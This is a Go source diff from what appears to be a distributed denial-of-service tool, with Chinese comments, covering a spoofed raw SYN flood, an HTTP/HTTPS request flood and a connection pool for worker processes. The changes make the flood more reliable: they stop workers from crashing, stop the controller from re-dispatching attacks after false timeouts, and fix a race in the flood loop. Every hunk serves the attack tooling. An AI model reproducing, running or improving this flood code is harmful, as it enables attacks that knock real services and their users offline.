@@ -269,6 +269,9 @@ type udpConnPool struct {
 	addr  *net.UDPAddr
 	mu    sync.Mutex
 	size  int
+	// closed 置位后 release 不再向 conns 发送（closeAll 已关闭 channel，
+	// 向已关闭 channel 发送会 panic 并打挂整个 worker 进程）
+	closed atomic.Bool
 }
 
 func newUDPConnPool(addr *net.UDPAddr, size int) *udpConnPool {
@@ -314,6 +317,11 @@ func (p *udpConnPool) release(conn *net.UDPConn) {
 	if conn == nil {
 		return
 	}
+	// 池已关闭：直接关闭连接，绝不向已关闭 channel 发送
+	if p.closed.Load() {
+		conn.Close()
+		return
+	}
 	select {
 	case p.conns <- conn:
 		// 成功归还
@@ -324,6 +332,12 @@ func (p *udpConnPool) release(conn *net.UDPConn) {
 }
 
 func (p *udpConnPool) closeAll() {
+	// 先置位 closed（release 之后的发送全部短路），再关闭 channel 与连接。
+	// 否则 5s 超时后仍有 goroutine 在 acquire/release 之间时，
+	// release 会向已关闭 channel 发送 → panic → worker 进程退出。
+	if p.closed.Swap(true) {
+		return // 幂等：重复调用直接返回
+	}
 	close(p.conns)
 	for conn := range p.conns {
 		conn.Close()
@@ -1191,11 +1205,10 @@ func StartTCPFloodEx(cfg AttackConfig) *AttackSession {
 	if mode == "syn" && SupportsSpoofing() {
 		if src := outboundIPv4(); src != [4]byte{} {
 			go func() {
+				// runRawSYNFlood 内部已按 dur/StopChan 收敛并等待自身 goroutine
+				// 退出——此处不能再等一个 dur（否则 DoneChan 在 2×Duration 才
+				// 关闭，Controller 按 duration 判超时 → 误判超时并重复派发）。
 				runRawSYNFlood(s, targets, cfg.Threads, dur, src)
-				select {
-				case <-time.After(dur):
-				case <-s.StopChan:
-				}
 				s.finish()
 				close(s.DoneChan)
 			}()
@@ -1398,7 +1411,8 @@ const inFlightPerThread = 48
 
 // dialHTTPConn 建立 HTTP/1.1 原始连接（http 明文 / https TLS 直连）。
 // 失败返回 nil（调用方计数错误并重试）。
-func dialHTTPConn(tgt string, useTLS bool) net.Conn {	u, err := url.Parse(tgt)
+func dialHTTPConn(tgt string, useTLS bool) net.Conn {
+	u, err := url.Parse(tgt)
 	if err != nil || u.Host == "" {
 		return nil
 	}
@@ -1432,23 +1446,24 @@ func (s *AttackSession) runRawHTTPLoop(seed int, targets []string, dur time.Dura
 	const connsPerThread = 6
 	const pipeDepth = 8
 
-	rng := NewFastRNG(time.Now().UnixNano() + int64(seed))
 	useTLS := strings.HasPrefix(targets[0], "https")
 	var targetIdx uint64
-
-	var body []byte
-	if method == "POST" {
-		body = make([]byte, bodySize)
-	}
 
 	var slotWG sync.WaitGroup
 	for slot := 0; slot < connsPerThread; slot++ {
 		slotWG.Add(1)
-		go func() {
+		go func(slot int) {
 			defer slotWG.Done()
 			tc := newTimeCache()
 			endTime := time.Now().Add(dur)
 			var conn net.Conn
+			// 每槽独立 RNG 与 body 缓冲：线程级共享会被 6 个槽并发读写
+			// （go race 实测命中，且随机路径/UA 序列会重复）
+			rng := NewFastRNG(time.Now().UnixNano() + int64(seed) + int64(slot)*7919)
+			var body []byte
+			if method == "POST" {
+				body = make([]byte, bodySize)
+			}
 
 			for tc.since(endTime) < 0 {
 				select {
@@ -1529,7 +1544,7 @@ func (s *AttackSession) runRawHTTPLoop(seed int, targets []string, dur time.Dura
 					conn = nil
 				}
 			}
-		}()
+		}(slot)
 	}
 	slotWG.Wait()
 }
